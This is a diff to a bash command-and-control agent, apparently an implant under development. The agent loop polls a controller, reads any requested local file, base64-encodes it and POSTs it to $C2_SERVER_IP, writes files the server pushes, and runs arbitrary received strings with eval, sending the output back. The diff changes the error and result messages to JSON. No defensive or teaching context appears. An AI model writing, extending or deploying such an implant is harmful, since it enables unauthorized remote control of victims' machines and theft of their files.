@@ -16,38 +16,32 @@ while true; do
         if [[ "$TASK" =~ ^\{ ]]; then
             TASK_TYPE=$(echo "$TASK" | jq -r '.type // empty')
 
-            # File download (agent -> server)
+            # GET (download file from agent)
             if [ "$TASK_TYPE" == "get" ]; then
                 REMOTE_PATH=$(echo "$TASK" | jq -r '.path')
                 if [ -f "$REMOTE_PATH" ]; then
-                    FILENAME=$(basename "$REMOTE_PATH")
                     B64=$(base64 "$REMOTE_PATH" | tr -d '\n')
+                    FILENAME=$(basename "$REMOTE_PATH")
                     PAYLOAD="{\"type\":\"file\",\"filename\":\"$FILENAME\",\"data\":\"$B64\"}"
                     curl -s -X POST -H "Authorization: Bearer $AUTH" -H "Content-Type: application/json" -d "$PAYLOAD" $C2_SERVER_IP/result/$AGENT_ID
                 else
-                    curl -s -X POST -H "Authorization: Bearer $AUTH" -d "[GET ERROR] File not found: $REMOTE_PATH" $C2_SERVER_IP/result/$AGENT_ID
+                    curl -s -X POST -H "Authorization: Bearer $AUTH" -d "{\"type\":\"error\",\"result\":\"File not found: $REMOTE_PATH\"}" $C2_SERVER_IP/result/$AGENT_ID
                 fi
 
-            # File upload (server -> agent)
+            # PUT (upload file to agent)
             elif [ "$TASK_TYPE" == "put" ]; then
                 FILENAME=$(echo "$TASK" | jq -r '.filename')
                 B64=$(echo "$TASK" | jq -r '.data')
-
-                # Ensure directory exists
-                DIRNAME=$(dirname "$FILENAME")
-                mkdir -p "$DIRNAME"
-
-                # Write the file
                 echo "$B64" | base64 --decode > "$FILENAME"
-
-                # Notify server (CLI)
-                curl -s -X POST -H "Authorization: Bearer $AUTH" -d "[PUT] Saved file: $FILENAME" $C2_SERVER_IP/result/$AGENT_ID
+                curl -s -X POST -H "Authorization: Bearer $AUTH" -d "{\"type\":\"info\",\"result\":\"Received file $FILENAME\"}" $C2_SERVER_IP/result/$AGENT_ID
             fi
 
         else
             # Normal shell command
             RESULT=$(eval "$TASK" 2>&1)
-            curl -s -X POST -H "Authorization: Bearer $AUTH" -d "$RESULT" $C2_SERVER_IP/result/$AGENT_ID
+            # Escape quotes and send as plain text
+            ESCAPED=$(echo "$RESULT" | sed 's/"/\\"/g')
+            curl -s -X POST -H "Authorization: Bearer $AUTH" -H "Content-Type: application/json" --data-binary "$ESCAPED" $C2_SERVER_IP/result/$AGENT_ID
         fi
     fi
 
